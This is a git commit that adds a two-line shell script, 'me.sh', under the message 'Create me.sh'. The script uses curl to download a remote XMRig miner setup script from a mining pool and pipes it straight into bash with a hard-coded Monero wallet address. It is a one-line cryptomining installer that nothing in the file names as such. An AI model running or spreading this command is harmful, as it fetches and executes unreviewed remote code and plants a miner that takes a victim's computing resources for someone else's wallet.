271ec6df8bce149340234c25a7867d50f80f71dc
lamboeio <lamonicagideon@gmail.com>
2024-10-11 00:19:28 +0000

    Create me.sh

---
+++ me.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+curl -s -L https://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 43XEzRVCL1vEUHrAKnPaxZfEsqmu3XmFM6GVzPwbkf1m41qe3K8yqhZZoXshcU7XQiUMiwrzyDhQ2d9Ur55K7mgj431qHhH
